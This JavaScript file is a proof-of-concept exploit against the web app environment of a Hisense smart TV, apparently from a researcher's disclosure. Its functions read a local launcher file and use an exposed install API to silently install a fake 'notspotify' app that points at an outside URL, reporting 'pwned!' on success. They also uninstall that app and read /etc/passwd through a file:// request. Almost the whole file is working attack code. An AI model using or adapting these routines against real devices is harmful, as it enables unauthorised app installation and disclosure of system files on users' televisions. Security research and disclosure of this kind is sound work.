
    function do_netflix_poc() {
    try {
        var daText = File.read("launcher/netflixtile.json", 1);
        $('code:contains("Netflix PoC")').text(daText);
    }
    catch(TypeError) {
        $('code:contains("Netflix PoC")').text("Failed");
    }
}

///////////////////////////

function installCallBack(res) {

    if (res == 0) {
        // ok
        $('code:contains("Installation Failed")').text("pwned!");
    } else {
        // fail
    }

}

function do_install_poc() {
        $('code:contains("Install PoC")').text("Installation Failed");
    // fake spotify app
    var thumb = "https://developer.spotify.com/assets/branding-guidelines/icon4@2x.png";
    // bananamafia
    //var thumb = "https://pbs.twimg.com/profile_images/1144333025490210816/grBuwqHH_400x400.png";

    var appName = "notspotify";

    var thumbnail = thumb;
    var iconSmall = thumb;
    var iconBig = thumb;
    var AppUrl = "https://bananamafia.dev/post/hisensehax?yolo=1337";
    var storetype = "store";
    var appId = appName;

    Hisense_installApp(appId, appName, thumbnail, iconSmall, iconBig, AppUrl, storetype, installCallBack);
}

function do_uninstall_poc() {
        Hisense_uninstallApp("notspotify", installCallBack);
}

///////////////////////////

function do_passwd_poc() {
        $('code:contains("/etc/passwd PoC")').text("Reading /etc/passwd Failed");
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", "file:///etc/passwd", false);
    rawFile.onreadystatechange = function () {
        if (rawFile.readyState === 4) {
            if (rawFile.status === 200 || rawFile.status == 0) {
                var daText = rawFile.responseText;
                $('code:contains("Reading /etc/passwd Failed")').text(daText);

            }
        }
    }
    rawFile.send(null);
}